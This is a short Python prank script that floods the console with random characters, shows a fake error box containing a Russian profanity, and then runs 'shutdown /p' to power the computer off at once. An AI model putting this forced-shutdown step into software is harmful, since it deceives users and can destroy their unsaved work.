import os
from os import error
import random
import tkinter as tk
from tkinter import messagebox
import time

def main():
    for i in range(1,30000):
        x = random.choice(["a", "s", "d", "f", "g", "h", "j", "k", "l", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
        y = random.choice(["a", "s", "d", "f", "g", "h", "j", "k", "l", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
        u = random.choice(["a", "s", "d", "f", "g", "h", "j", "k", "l", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
        k = random.choice(["a", "s", "d", "f", "g", "h", "j", "k", "l", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
        o = random.choice(["a", "s", "d", "f", "g", "h", "j", "k", "l", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "z", "x", "c", "v", "b", "n", "m", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
        print(x ,y ,u ,k ,o ,y ,x ,o ,k ,u ,o , x ,o ,y ,k ,u ,k ,o ,y ,u ,k ,o ,y ,x ,o ,k ,u ,o , x ,o ,y ,k ,u ,k ,o ,y ,u ,k ,o ,y ,x ,o ,k ,u ,o , x ,o ,y ,k ,u ,k ,o ,y ,u ,k ,o ,y ,x ,o ,k ,u ,o , x )

def shotdown():
    os.system("shutdown /p")

def erorr():
    messagebox.showerror("Erorr   ", "     suka blyat     ")
    time.sleep(0.2)

main()
erorr()
shotdown()